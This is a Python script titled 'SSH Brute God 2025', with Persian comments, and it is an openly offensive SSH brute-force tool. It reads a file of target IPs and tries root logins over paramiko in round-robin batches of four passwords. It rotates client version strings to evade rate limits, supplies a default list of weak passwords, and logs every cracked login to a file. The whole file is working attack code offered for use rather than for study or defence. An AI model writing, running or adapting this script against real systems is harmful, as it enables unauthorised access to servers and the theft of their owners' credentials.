#!/usr/bin/env python3
import asyncio
import sys
import time
import os
import psutil
import argparse
import random
from datetime import timedelta, datetime
import paramiko

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1",
    "SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3",
    "SSH-2.0-libssh_0.9.6",
]

print("""
╔═══════════════════════════════════════════════════════════╗
║ SSH Brute God 2025 – توسط بهترین هکر دنیا                 ║
║ Smart Round-Robin Brute – 4 Passwords per IP              ║
║ Random User-Agent – Rate-Limit Safe – Live Stats          ║
╚═══════════════════════════════════════════════════════════╝
""")

parser = argparse.ArgumentParser(description="SSH Brute God 2025 – Smart Round-Robin")
parser.add_argument("ips_file", help="File with IPs (e.g., ips.txt)")
parser.add_argument("passwords_file", nargs='?', default=None, help="File with passwords (optional – default list)")
parser.add_argument("-t", "--threads", type=int, default=100, help="Number of threads (default: 100)")
args = parser.parse_args()

ips_file = args.ips_file
passwords_file = args.passwords_file
MAX_WORKERS = args.threads

results_file = f"ssh_success_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

DEFAULT_PASSWORDS = [
    "", "admin", "123456", "password", "root", "toor", "1234", "12345",
    "P@ssw0rd", "administrator", "kali", "ubuntu", "centos", "debian"
]

stats = {"total_ips": 0, "total_pwds": 0, "tested": 0, "success": 0, "start_time": time.time()}
cpu_proc = psutil.Process(os.getpid())

USERNAME = "root"
PASS_PER_ROUND = 4  # هر دور 4 پسورد روی هر IP

# =============== LOAD DATA ===============
def load_ips(file_path):
    targets = []
    with open(file_path, 'r') as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith('#'):
                if ':' in line:
                    ip, port = line.split(':', 1)
                    port = int(port.split()[0])
                    targets.append((ip.strip(), port))
                else:
                    targets.append((line.strip(), 22))
    return targets

def load_passwords(file_path=None):
    if file_path:
        with open(file_path, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    return DEFAULT_PASSWORDS

# =============== BRUTE FUNCTION (Round-Robin) ===============
async def brute_worker(ip_queue, pwd_chunks, sem):
    while True:
        try:
            ip, port = await ip_queue.get()
        except:
            break

        async with sem:
            for chunk in pwd_chunks:
                for pwd in chunk:
                    try:
                        transport = paramiko.Transport((ip, port))
                        transport.connect(timeout=10)
                        # Random User-Agent
                        transport.local_version = random.choice(USER_AGENTS)
                        transport.auth_password(username=USERNAME, password=pwd)
                        if transport.is_authenticated():
                            line = f"[SUCCESS] {ip}:{port} | User: root | Password: {pwd}"
                            print(f"\n\033[91m{line}\033[0m")
                            with open(results_file, "a") as f:
                                f.write(line + "\n")
                            stats["success"] += 1
                            transport.close()
                            ip_queue.task_done()
                            return
                        transport.close()
                    except:
                        pass
                stats["tested"] += len(chunk)
            ip_queue.task_done()

# =============== LIVE STATS ===============
async def periodic_stats(total_combinations):
    while True:
        await asyncio.sleep(1)
        elapsed = time.time() - stats["start_time"]
        speed = stats["tested"] / elapsed if elapsed > 0 else 0
        eta = (total_combinations - stats["tested"]) / speed if speed > 0 else 999999
        cpu = cpu_proc.cpu_percent()
        print(f"\r[SSH Brute God LIVE] "
              f"Tested: {stats['tested']:,}/{total_combinations:,} "
              f"({stats['tested']/total_combinations*100:.2f}%) | "
              f"Success: {stats['success']:,} | "
              f"Speed: {speed:,.0f} tests/s | "
              f"CPU: {cpu:.1f}% | "
              f"ETA: {str(timedelta(seconds=int(eta)))}      ", end="", flush=True)

# =============== MAIN ===============
async def main():
    all_ips = load_ips(ips_file)
    passwords = load_passwords(passwords_file)

    stats["total_ips"] = len(all_ips)
    stats["total_pwds"] = len(passwords)
    total_combinations = len(all_ips) * len(passwords)

    print(f"[+] Total IPs: {len(all_ips):,} | Total Passwords: {len(passwords):,} | Total Combinations: {total_combinations:,}")
    print(f"[+] Threads: {MAX_WORKERS} | 4 passwords per round per IP")

    # تقسیم پسوردها به چانک‌های 4 تایی
    pwd_chunks = [passwords[i:i + PASS_PER_ROUND] for i in range(0, len(passwords), PASS_PER_ROUND)]

    sem = asyncio.Semaphore(MAX_WORKERS)
    loop = asyncio.get_event_loop()
    loop.create_task(periodic_stats(total_combinations))

    # صف IPها – دور به دور پر می‌شه
    while pwd_chunks:
        ip_queue = asyncio.Queue()
        for ip in all_ips:
            ip_queue.put_nowait(ip)

        current_chunk = pwd_chunks.pop(0)
        tasks = [brute_worker(ip_queue, [current_chunk], sem) for _ in range(MAX_WORKERS)]
        await asyncio.gather(*tasks)

        # اگر هنوز پسورد باقی مونده، دوباره از اول IPها شروع کن
        if pwd_chunks:
            print(f"\n[+] Round complete – Starting next round with {len(pwd_chunks[0])} passwords...")

    elapsed = time.time() - stats["start_time"]
    speed = stats["tested"] / elapsed if elapsed > 0 else 0
    print(f"\n\n[SSH Brute God FINAL] Tested: {stats['tested']:,}/{total_combinations:,} | Success: {stats['success']:,} | Avg Speed: {speed:,.0f} tests/s")
    print(f"[+] Brute complete!")
    print(f"    Successes → {results_file}")

if __name__ == "__main__":
    asyncio.run(main())
